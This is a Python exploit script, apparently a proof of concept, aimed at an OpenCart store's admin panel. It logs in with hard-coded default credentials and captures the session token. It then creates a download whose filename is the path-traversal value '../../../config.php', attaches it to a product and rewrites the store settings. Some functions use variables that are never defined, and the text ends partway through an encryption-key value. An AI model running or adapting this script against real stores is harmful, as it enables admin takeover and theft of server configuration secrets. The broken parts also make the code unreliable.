import requests
requests.packages.urllib3.disable_warnings()
host = 'opencart66.com'


def loginad():
   burp0_url = "http://"+host+":80//admin/index.php?route=common/login"
   burp0_headers = {"Referer": "https://"+host+"/admin/", 
   "Cache-Control": "max-age=0", 
   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
   "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3",
   "Content-Type": "multipart/form-data; boundary=---------------------------7e43b42b30a14", 
   "Upgrade-Insecure-Requests": "1", 
   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", 
   "Accept-Encoding": "gzip, deflate", 
   "Connection": "close"}


   burp0_data = "-----------------------------7e43b42b30a14\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nuser\r\n-----------------------------7e43b42b30a14\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\nbitnami1\r\n-----------------------------7e43b42b30a14--\r\n"
    # r=requests.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False)
#cookies=r.cookies.get_dict()

#cookie
   #  cookies=r.cookies['OCSESSID']

#token
   session = requests.Session()
   res = session.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False, allow_redirects=False)
   location=res.headers['location']
   cookies=res.cookies['OCSESSID']
   token=location[-32:]
     
   #print(cookies)
   #print(token)
   return {
    'cookies': cookies,
    'token': token
     }




def addfile():

    burp0_data = "------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"download_description[1][name]\"\r\n\r\nfile\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n../../../config.php\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"mask\"\r\n\r\n1111\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE--\r\n"
    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
    #print(r.status_code)
   
   
def setfile():
    burp0_url = "http://"+host+":80//admin/index.php?route=catalog/product/edit&user_token="+adtoken+"&product_id=41"
    burp0_cookies = {"OCSESSID": adcookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
    burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=catalog/product/edit&user_token="+adtoken+"&product_id=41", "Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e420b271064c", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    burp0_data = "-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_description[1][name]\"\r\n\r\niMac\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_description[1][description]\"\r\n\r\n<div>\r\n\tJust when you thought iMac had everything, now there\xc2\xb4s even more. More powerful Intel Core 2 Duo processors. And more memory standard. Combine this with Mac OS X Leopard and iLife \xc2\xb408, and it\xc2\xb4s more all-in-one than ever. iMac packs amazing performance into a stunningly slim space.</div>\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"files\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_description[1][meta_title]\"\r\n\r\niMac\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_description[1][meta_description]\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_description[1][meta_keyword]\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_description[1][tag]\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"model\"\r\n\r\nProduct 14\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"sku\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"upc\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"ean\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"jan\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"isbn\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"mpn\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"location\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"price\"\r\n\r\n100.0000\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"tax_class_id\"\r\n\r\n9\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n976\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"minimum\"\r\n\r\n1\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"subtract\"\r\n\r\n1\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"stock_status_id\"\r\n\r\n5\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"shipping\"\r\n\r\n1\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"date_available\"\r\n\r\n2009-02-03\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"length\"\r\n\r\n0.00000000\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n0.00000000\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n0.00000000\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"length_class_id\"\r\n\r\n1\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"weight\"\r\n\r\n5.00000000\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"weight_class_id\"\r\n\r\n1\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"status\"\r\n\r\n1\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"sort_order\"\r\n\r\n0\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"manufacturer\"\r\n\r\nApple\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"manufacturer_id\"\r\n\r\n8\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"category\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_category[]\"\r\n\r\n27\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"filter\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_store[]\"\r\n\r\n0\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"download\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_download[]\"\r\n\r\n1\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"related\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_related[]\"\r\n\r\n42\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"option\"\r\n\r\n\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"image\"\r\n\r\ncatalog/demo/imac_1.jpg\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_image[0][image]\"\r\n\r\ncatalog/demo/imac_3.jpg\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_image[0][sort_order]\"\r\n\r\n0\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_image[1][image]\"\r\n\r\ncatalog/demo/imac_2.jpg\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_image[1][sort_order]\"\r\n\r\n0\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"points\"\r\n\r\n0\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_reward[1][points]\"\r\n\r\n0\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_seo_url[0][1]\"\r\n\r\nimac\r\n-----------------------------7e420b271064c\r\nContent-Disposition: form-data; name=\"product_layout[0]\"\r\n\r\n\r\n-----------------------------7e420b271064c--\r\n"
    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,verify=False)
    set1=r.status_code
    return set1

    
def setdownload():
    burp0_url = "http://"+host+":80//admin/index.php?route=setting/setting&user_token="+adtoken
    burp0_cookies = {"OCSESSID": adcookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
    burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=setting/setting&user_token="+adtoken, "Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e417d361064c", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    burp0_data = "-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_meta_title\"\r\n\r\nYour Store\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_meta_description\"\r\n\r\nMy Store\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_meta_keyword\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_theme\"\r\n\r\ndefault\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_layout_id\"\r\n\r\n4\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_name\"\r\n\r\nYour Store\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_owner\"\r\n\r\nYour Name\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_address\"\r\n\r\nAddress 1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_geocode\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_email\"\r\n\r\nuser@example.com\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_telephone\"\r\n\r\n123456789\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_fax\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_image\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_open\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_comment\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_country_id\"\r\n\r\n222\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_zone_id\"\r\n\r\n3563\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_language\"\r\n\r\nen-gb\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_admin_language\"\r\n\r\nen-gb\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_currency\"\r\n\r\nUSD\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_currency_auto\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_length_class_id\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_weight_class_id\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_product_count\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_limit_admin\"\r\n\r\n20\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_review_status\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_review_guest\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_voucher_min\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_voucher_max\"\r\n\r\n1000\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_tax\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_tax_default\"\r\n\r\nshipping\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_tax_customer\"\r\n\r\nshipping\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_customer_online\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_customer_activity\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_customer_search\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_customer_group_id\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_customer_group_display[]\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_customer_price\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_login_attempts\"\r\n\r\n5\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_account_id\"\r\n\r\n3\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_invoice_prefix\"\r\n\r\nINV-2013-00\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_cart_weight\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_checkout_guest\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_checkout_id\"\r\n\r\n5\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_order_status_id\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n7\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n9\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n13\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n5\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n8\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n14\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n10\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n15\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n2\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n11\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n12\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_processing_status[]\"\r\n\r\n3\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n7\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n9\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n13\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n5\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n8\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n14\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n10\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n15\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n2\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n11\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n12\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n3\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_complete_status[]\"\r\n\r\n16\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_fraud_status_id\"\r\n\r\n7\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_api_id\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_stock_display\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_stock_warning\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_stock_checkout\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_affiliate_group_id\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_affiliate_approval\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_affiliate_auto\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_affiliate_commission\"\r\n\r\n5\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_affiliate_id\"\r\n\r\n4\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_return_id\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_return_status_id\"\r\n\r\n2\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_captcha\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_captcha_page[]\"\r\n\r\nreview\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_captcha_page[]\"\r\n\r\nreturn\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_captcha_page[]\"\r\n\r\ncontact\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_logo\"\r\n\r\ncatalog/logo.png\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_icon\"\r\n\r\ncatalog/cart.png\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_engine\"\r\n\r\nmail\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_parameter\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_smtp_hostname\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_smtp_username\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_smtp_password\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_smtp_port\"\r\n\r\n25\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_smtp_timeout\"\r\n\r\n5\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_alert[]\"\r\n\r\norder\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_mail_alert_email\"\r\n\r\n\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_maintenance\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_seo_url\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_robots\"\r\n\r\nabot\r\ndbot\r\nebot\r\nhbot\r\nkbot\r\nlbot\r\nmbot\r\nnbot\r\nobot\r\npbot\r\nrbot\r\nsbot\r\ntbot\r\nvbot\r\nybot\r\nzbot\r\nbot.\r\nbot/\r\n_bot\r\n.bot\r\n/bot\r\n-bot\r\n:bot\r\n(bot\r\ncrawl\r\nslurp\r\nspider\r\nseek\r\naccoona\r\nacoon\r\nadressendeutschland\r\nah-ha.com\r\nahoy\r\naltavista\r\nananzi\r\nanthill\r\nappie\r\narachnophilia\r\narale\r\naraneo\r\naranha\r\narchitext\r\naretha\r\narks\r\nasterias\r\natlocal\r\natn\r\natomz\r\naugurfind\r\nbackrub\r\nbannana_bot\r\nbaypup\r\nbdfetch\r\nbig brother\r\nbiglotron\r\nbjaaland\r\nblackwidow\r\nblaiz\r\nblog\r\nblo.\r\nbloodhound\r\nboitho\r\nbooch\r\nbradley\r\nbutterfly\r\ncalif\r\ncassandra\r\nccubee\r\ncfetch\r\ncharlotte\r\nchurl\r\ncienciaficcion\r\ncmc\r\ncollective\r\ncomagent\r\ncombine\r\ncomputingsite\r\ncsci\r\ncurl\r\ncusco\r\ndaumoa\r\ndeepindex\r\ndelorie\r\ndepspid\r\ndeweb\r\ndie blinde kuh\r\ndigger\r\nditto\r\ndmoz\r\ndocomo\r\ndownload express\r\ndtaagent\r\ndwcp\r\nebiness\r\nebingbong\r\ne-collector\r\nejupiter\r\nemacs-w3 search engine\r\nesther\r\nevliya celebi\r\nezresult\r\nfalcon\r\nfelix ide\r\nferret\r\nfetchrover\r\nfido\r\nfindlinks\r\nfireball\r\nfish search\r\nfouineur\r\nfunnelweb\r\ngazz\r\ngcreep\r\ngenieknows\r\ngetterroboplus\r\ngeturl\r\nglx\r\ngoforit\r\ngolem\r\ngrabber\r\ngrapnel\r\ngralon\r\ngriffon\r\ngromit\r\ngrub\r\ngulliver\r\nhamahakki\r\nharvest\r\nhavindex\r\nhelix\r\nheritrix\r\nhku www octopus\r\nhomerweb\r\nhtdig\r\nhtml index\r\nhtml_analyzer\r\nhtmlgobble\r\nhubater\r\nhyper-decontextualizer\r\nia_archiver\r\nibm_planetwide\r\nichiro\r\niconsurf\r\niltrovatore\r\nimage.kapsi.net\r\nimagelock\r\nincywincy\r\nindexer\r\ninfobee\r\ninformant\r\ningrid\r\ninktomisearch.com\r\ninspector web\r\nintelliagent\r\ninternet shinchakubin\r\nip3000\r\niron33\r\nisraeli-search\r\nivia\r\njack\r\njakarta\r\njavabee\r\njetbot\r\njumpstation\r\nkatipo\r\nkdd-explorer\r\nkilroy\r\nknowledge\r\nkototoi\r\nkretrieve\r\nlabelgrabber\r\nlachesis\r\nlarbin\r\nlegs\r\nlibwww\r\nlinkalarm\r\nlink validator\r\nlinkscan\r\nlockon\r\nlwp\r\nlycos\r\nmagpie\r\nmantraagent\r\nmapoftheinternet\r\nmarvin/\r\nmattie\r\nmediafox\r\nmediapartners\r\nmercator\r\nmerzscope\r\nmicrosoft url control\r\nminirank\r\nmiva\r\nmj12\r\nmnogosearch\r\nmoget\r\nmonster\r\nmoose\r\nmotor\r\nmultitext\r\nmuncher\r\nmuscatferret\r\nmwd.search\r\nmyweb\r\nnajdi\r\nnameprotect\r\nnationaldirectory\r\nnazilla\r\nncsa beta\r\nnec-meshexplorer\r\nnederland.zoek\r\nnetcarta webmap engine\r\nnetmechanic\r\nnetresearchserver\r\nnetscoop\r\nnewscan-online\r\nnhse\r\nnokia6682/\r\nnomad\r\nnoyona\r\nnutch\r\nnzexplorer\r\nobjectssearch\r\noccam\r\nomni\r\nopen text\r\nopenfind\r\nopenintelligencedata\r\norb search\r\nosis-project\r\npack rat\r\npageboy\r\npagebull\r\npage_verifier\r\npanscient\r\nparasite\r\npartnersite\r\npatric\r\npear.\r\npegasus\r\nperegrinator\r\npgp key agent\r\nphantom\r\nphpdig\r\npicosearch\r\npiltdownman\r\npimptrain\r\npinpoint\r\npioneer\r\npiranha\r\nplumtreewebaccessor\r\npogodak\r\npoirot\r\npompos\r\npoppelsdorf\r\npoppi\r\npopular iconoclast\r\npsycheclone\r\npublisher\r\npython\r\nrambler\r\nraven search\r\nroach\r\nroad runner\r\nroadhouse\r\nrobbie\r\nrobofox\r\nrobozilla\r\nrules\r\nsalty\r\nsbider\r\nscooter\r\nscoutjet\r\nscrubby\r\nsearch.\r\nsearchprocess\r\nsemanticdiscovery\r\nsenrigan\r\nsg-scout\r\nshai'hulud\r\nshark\r\nshopwiki\r\nsidewinder\r\nsift\r\nsilk\r\nsimmany\r\nsite searcher\r\nsite valet\r\nsitetech-rover\r\nskymob.com\r\nsleek\r\nsmartwit\r\nsna-\r\nsnappy\r\nsnooper\r\nsohu\r\nspeedfind\r\nsphere\r\nsphider\r\nspinner\r\nspyder\r\nsteeler/\r\nsuke\r\nsuntek\r\nsupersnooper\r\nsurfnomore\r\nsven\r\nsygol\r\nszukacz\r\ntach black widow\r\ntarantula\r\ntempleton\r\n/teoma\r\nt-h-u-n-d-e-r-s-t-o-n-e\r\ntheophrastus\r\ntitan\r\ntitin\r\ntkwww\r\ntoutatis\r\nt-rex\r\ntutorgig\r\ntwiceler\r\ntwisted\r\nucsd\r\nudmsearch\r\nurl check\r\nupdated\r\nvagabondo\r\nvalkyrie\r\nverticrawl\r\nvictoria\r\nvision-search\r\nvolcano\r\nvoyager/\r\nvoyager-hc\r\nw3c_validator\r\nw3m2\r\nw3mir\r\nwalker\r\nwallpaper\r\nwanderer\r\nwauuu\r\nwavefire\r\nweb core\r\nweb hopper\r\nweb wombat\r\nwebbandit\r\nwebcatcher\r\nwebcopy\r\nwebfoot\r\nweblayers\r\nweblinker\r\nweblog monitor\r\nwebmirror\r\nwebmonkey\r\nwebquest\r\nwebreaper\r\nwebsitepulse\r\nwebsnarf\r\nwebstolperer\r\nwebvac\r\nwebwalk\r\nwebwatch\r\nwebwombat\r\nwebzinger\r\nwhizbang\r\nwhowhere\r\nwild ferret\r\nworldlight\r\nwwwc\r\nwwwster\r\nxenu\r\nxget\r\nxift\r\nxirq\r\nyandex\r\nyanga\r\nyeti\r\nyodao\r\nzao\r\nzippp\r\nzyborg\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_compression\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_secure\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_password\"\r\n\r\n1\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_shared\"\r\n\r\n0\r\n-----------------------------7e417d361064c\r\nContent-Disposition: form-data; name=\"config_encryption\"\r\n\r\nX0VEutkm572jjaGNRXrH0VwRGz7jYFyNPJrCpe5xjh8hDmeHhmdtN5nJfvq87H34aAbm88qLoiAADWfDUaN7jkbXAJTiNJcK5nqOwZu4uGzNvFSyGXp9kMeugrSPLcea2ANVCoFznrpyjzCjLOQAxWuORCGRceeQoEvv3BPAQYJqvhFfhfMKxr0WLhlgZO2TVmasLbbiaXd17BypbtLH5RYnOvy7SJi1sZcPgL34mWww56aTO7oapTyEnY4pkCCXJEA4eSheUZcxWeNetaaVzLUBMltNfF8eb8LKlo2paMYQDS48GCO19FhZtCrYYGCYycwFHdE9msbeMuNZNQJoLg2iX7lmiJo7fejW1SZIW9e9ES3boAfp1ecikcnwbcFJ2BC1NYKREL8ACAY8aDUCbgptBKowyGLUc8iJZSLmHODlHz6TKieWdO4CXJ8wxIUj1J7c3QYos0xETFiSMLnMimUPvbhoBma98OsDtjrjmwCZvL4hOqtLGtL630ocVeyehhjGGxOQvBSdvOK2jDwz4hFDjqAu87rX3L5fHx4jypwI1qUmaoF7N3fDNKXXH0bBiW6dBbLB9GXtCPdu8QRtTacWWEpWse03B9Km0UguYHSDCFL7hmhWTpyshink3P0BNIy2ZO0EVIUddR049Y9IgozWev4gX1oyVfEkggfkBNluzSAAhKPVslZHrk7BgoFSaHQnGIhn41H3MJPCLWNhK9jfYsGEJcuS1CkiwQZrZp2530OuSm0geVsCFZatqQLBqJCAQzmNSHsGQgS3rbidzLz2QQuC6nzB5YtigaBhIcEzqyJjLuRn5pazRZZ5ZBpCoHbrL6UByiXZ3GObW6vfU4BxAifDBvGvfEBHhKzBEQZMCPpAlb93kdZgTR5n5lCjvlFrCqaiLWPv5cYU1xZboqyUklSZKLpJ5TUMSgQhYxE0ESXyihORzfcSt86f4gEdxs1AmyJyMLTCOTF2fhdf3r3JRyFwlDxg60lHyx